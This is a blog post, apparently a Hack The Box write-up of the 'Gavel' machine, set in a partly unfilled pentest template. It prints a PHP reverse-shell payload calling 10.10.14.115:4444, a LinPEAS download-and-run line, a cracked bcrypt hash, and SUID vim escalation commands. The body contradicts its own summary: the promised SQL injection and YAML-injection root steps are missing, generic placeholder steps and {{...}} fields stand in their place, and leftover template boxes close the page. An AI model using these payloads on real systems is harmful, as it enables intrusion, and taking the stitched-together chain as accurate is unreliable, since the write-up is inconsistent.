---
layout: post
title: Gavel - HTB Machine
date: 2025-12-13
categories:
  - hackthebox
  - linux
  - medium
  - HTB-Machines
tags:
  - sql-injection
  - rce
  - yaml-injection
  - php-runkit
  - git-leak
  - privilege-escalation
img_path: /assets/img/htb/machine/gavel_season9
image: /assets/img/htb/machine/gavel_season9/Gavel - HTB Machine.png
---

  

# Gavel - HTB Machine (Medium Linux)


>• **OS**: Linux • **Difficulty**: Medium • **Points**: 30 ports
  • **Release**: Season 9 week 11

## Summary
- Gavel is a medium-difficulty Linux machine featuring an auction web application with multiple vulnerabilities.
- Initial access is achieved through SQL injection that bypasses PDO prepared statement protection, allowing extraction of admin credentials. 
- After cracking the bcrypt hash, access to the admin panel enables Remote Code Execution via the `runkit_function_add()` PHP function.
- Privilege escalation involves exploiting a YAML injection vulnerability in a root-owned daemon process, bypassing PHP sandbox restrictions to obtain root access.


# Key Techniques & Tools

- Exposed `.git` directory leakage

- SQL injection bypassing prepared statements

- PHP `runkit_function_add()` RCE

- YAML deserialization for privilege escalation

- Tools: `git-dumper`, `sqlmap`, `john`, `curl`

## Metadata

| Field               | Value                 |
| ------------------- | --------------------- |
| **Target IP**       | `{{target_ip}}`       |
| **CVEs**            | `{{cve}}`             |
| **Vulnerabilities** | `{{vulnerabilities}}` |

## Improved Skills & Growth Tracking

| Skill          | Tool / Technique               | Resources                                                                               |
| -------------- | ------------------------------ | --------------------------------------------------------------------------------------- |
| SQL Injection  | `sqlmap`, Manual UNION/OUTFILE | [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)             |
| Log Poisoning  | UA/SSH Injection → RCE         | [HackTricks](https://book.hacktricks.xyz/pentesting-web/log-poisoning)                  |
| SUID Privesc   | GTFOBins (`vim`, `find`)       | [GTFOBins](https://gtfobins.github.io/)                                                 |
| Shell Upgrades | `script`, `socat`, PowerUp.ps1 | [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) |

## Tools Used (Categorized)
**Recon:** rustscan, nmap, enum4linux, crackmapexec
**Enum/Brute:** ffuf, gobuster, nikto, nuclei
**Exploit:** sqlmap, curl, impacket, juicypotato
**Privesc:** linpeas/winpeas, pspy64, GTFOBins, PowerUp
**Utils:** wget/certutil, nc

## References & Further Reading

- [GTFOBins](https://gtfobins.github.io/) — Linux Privesc
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/) — General Pentesting
- [IppSec HTB Walkthroughs](https://www.youtube.com/c/ippsec) — Video Guides
- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
- [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

---
#  Reconnaissance


> [!abstract] Phase Goal
> Identify open ports, services, and potential entry points **without exploitation**. Adapt scans for OS.


## Scanning Workflow

### Scan All TCP Ports
```bash
# Fast TCP sweep (RustScan for speed)
rustscan -a $TARGET_IP -r 1-65535 -t 10000 --ulimit 6500  -- -oN recon/rustscan.txt -oX recon/rustscan.xml

# Extract open ports
grep "^[0-9]" recon/rustscan.txt | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//' > recon/open_ports.txt
OPEN_PORTS=$(cat recon/open_ports.txt); echo "OPEN_PORTS=$OPEN_PORTS" | tee -a .env
echo "Open TCP Ports: $OPEN_PORTS"
```
### Scan Top 200 UDP Ports
```bash
sudo nmap -sU --top-ports 200 -oN recon/nmap_udp_top200 $TARGET_IP -vv
```
### Enumerated Open Ports
```bash
sudo nmap -sC -sV -Pn -vv $TARGET_IP -p $OPEN_PORTS -oA recon/nmap_detailed
```
```sh
PORT   STATE SERVICE REASON         VERSION

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1f:de:9d:84:bf:a1:64:be:1f:36:4f:ac:3c:52:15:92 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN/Hhg1nYlWGdi109d6k/OXFg0xbLVuEho3xQqX/DkRDPQ5Y9P6l2XLkbsSscgiQIq3/bHeX6T4mLci0/I/kHeI=
|   256 70:a5:1a:53:df:d1:d0:73:3e:9d:90:ad:c1:aa:b4:19 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMYFumAaeF6fOwurP+3zFG7iyLB1XC40te7RWDNVze0x

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://gavel.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: gavel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Open Ports & Services Table
| Port | State | Service | Version              |
| ---- | ----- | ------- | -------------------- |
| 22   | open  | ssh     | OpenSSH 8.9p1 Ubuntu |
| 80   | open  | http    | Apache httpd 2.4.52  |

---
# Service Enumeration
> [!abstract] Phase Goal
> Probe services for misconfigurations, leaks, and vulnerabilities. Use OS-specific tools.

## HTTP - Port 80
>Web Enumeration

### Adding `gavel.htb` to `/etc/hosts`:
```bash
echo "10.10.11.97 gavel.htb" | sudo tee -a /etc/hosts 
```
### Homepage
![600](</assets/Gavel - HTB Machine-1.png>)
### 404 Error Page
![](</assets/Gavel - HTB Machine-2.png>)
### Directory brute-force
```bash
gobuster dir -u http://gavel.htb -w /usr/share/wordlists/dirb/common.txt
```
```sh
/.git/HEAD            (Status: 200) [Size: 23]
/.hta                 (Status: 403) [Size: 274]
/.htaccess            (Status: 403) [Size: 274]
/.htpasswd            (Status: 403) [Size: 274]
/admin.php            (Status: 302) [Size: 0] [--> index.php]
/assets               (Status: 301) [Size: 307] [--> http://gavel.htb/assets/]
/includes             (Status: 301) [Size: 309] [--> http://gavel.htb/includes/]
/index.php            (Status: 200) [Size: 14010]
/rules                (Status: 301) [Size: 306] [--> http://gavel.htb/rules/]
/server-status        (Status: 403) [Size: 274]
```
### Git Repository Extraction
> use Git-Dumper 
```bash
git-dumper http://gavel.htb/.git/ ./gavel-git
cd gavel-git
git checkout .
```
![400](</assets/Gavel - HTB Machine-3.png>)
### Key Discoveries

| File                       | Purpose                                            |
| -------------------------- | -------------------------------------------------- |
| `inventory.php`            | SQL Injection vulnerability                        |
| `includes/bid_handler.php` | RCE via `runkit_function_add()`                    |
| `admin.php`                | Auction rule management (requires auctioneer role) |
| `includes/config.php`      | Database credentials: `gavel:gavel`                |

---
# Initial Access (Foothold)

> [!abstract] Phase Goal
> First stage of a cyberattack where attackers gain entry into a target's network or System.


```bash
echo 'auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS' > hash.txt
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```ad-important
title: Creds 
auctioneer:midnight1
```

![](</assets/Gavel - HTB Machine-4.png>)

```txt title:gavel_session
n2a99bcqrcnu8kkd54lerpkl6v
```

```bash
curl -s http://gavel.htb/bidding.php -H 'Cookie: gavel_session=n9u7898uuc2472fgv1eg1mqf2v' | grep -E 'auction_id|data-auction-id' -A 2 -B 2
```


```bash
system('bash -c "bash -i >& /dev/tcp/10.10.14.115/4444 0>&1"'); return true;
```

```bash
curl -X POST 'http://gavel.htb/includes/bid_handler.php' \
     -H 'X-Requested-With: XMLHttpRequest' \
     -H 'Cookie: PHPSESSID=n9u7898uuc2472fgv1eg1mqf2v' \
     -d 'auction_id=1&bid_amount=50000'
```
![](</assets/Gavel - HTB Machine-5.png>)

---
# Lateral Movement → User: `{{user}}`

> [!abstract] Phase Goal
> Enumerate internally, pivot to non-root/system user. Use OS-specific techniques.
## Internal Enumeration

```bash
# Automated (LinPEAS)
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh -o /tmp/linpeas.sh && bash /tmp/linpeas.sh | tee loot/linpeas.txt #Victim
# Manual
sudo -l > loot/sudo-l.txt
find / -perm -u=s -type f 2>/dev/null > loot/suid.txt
crontab -l > loot/crontab.txt
pspy64 > loot/pspy.log & # Run for 5-10 min
```
## Lateral Movement Vector

```bash
www-data@box:~$ sudo -l
User www-data may run the following commands:
    (ALL) NOPASSWD: /opt/backup.py
```
```python
# Hijack /opt/backup.py
import os
os.system("/bin/bash -i")
```

> Pivoted to: `user@box` / `user@DOMAIN` | Flag: `user.txt` = `{{user_flag}}`

{{image:user-pivot.png|User Shell & Flag|600}}

---
# 6. Privilege Escalation → `root`

> [!abstract] Phase Goal
> Escalate to highest privileges using OS-specific vectors.

## Internal Enumeration
```bash
# Automated (LinPEAS)
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh -o /tmp/linpeas.sh && bash /tmp/linpeas.sh | tee loot/linpeas.txt #Victim
# Manual
sudo -l > loot/sudo-l.txt
find / -perm -u=s -type f 2>/dev/null > loot/suid.txt
crontab -l > loot/crontab.txt
pspy64 > loot/pspy.log & # Run for 5-10 min
# Kernel exploits check
searchsploit "Linux Kernel {{kernel_version}}" > loot/kernel_exploits.txt
```
## Privilege Escalation Vector
> [!success] **Vector:** SUID Binary Abuse (`vim`) (Linux) or PrintSpooler (Windows)

```bash
# Confirm SUID
find / -perm -u=s -type f 2>/dev/null | grep vim
/usr/bin/vim (SUID set)
```

```bash
# Exploit SUID vim via GTFOBins
/usr/bin/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "sh")'
# Alternative: /usr/bin/vim -c ':!/bin/sh'
```

> Escalated to: `root@box`| Flag: `root.txt` = `{{root_flag}}`

![](</assets/Gavel - HTB Machine-6.png>)

---
# 7. Post-Exploitation & Cleanup
>Date: {{DD MMM YY}} Time: {{start}} - {{end}} | {{duration(m)}}

> [!abstract] Phase Goal
> Extract sensitive data, persist if needed, then clean up.

> [!warning] Cleanup Commands
> - Remove shells: `rm /var/www/html/uploads/shell.php`
> - Reset scripts/services
> - Kill processes: `killall nc pspy64`
> - Submit flags, retire box.
```bash
rm /var/www/html/uploads/shell.php
killall nc pspy64
# Reset modified files
```

---
# Trophies
## User Flag
```txt
22b5b6981fb8b2c64dd781dd48091e5d
```
## Root Flag
```txt
{{root_flag}}
```
## /etc/shadow
```bash
grep cat /etc/shadow | grep -E "%$" 
```
```txt
```
# Proof of Box Pwned
![](</assets/Gavel - HTB Machine-7.png>)
  

# test 

> **Note**
> Your note text here.
{: .prompt-info}

> **Tip**
> Helpful tip.
{: .prompt-tip}

> **Important**
> Critical info.
{: .prompt-important}

> **Caution**
> Danger/caution.
{: .prompt-danger}
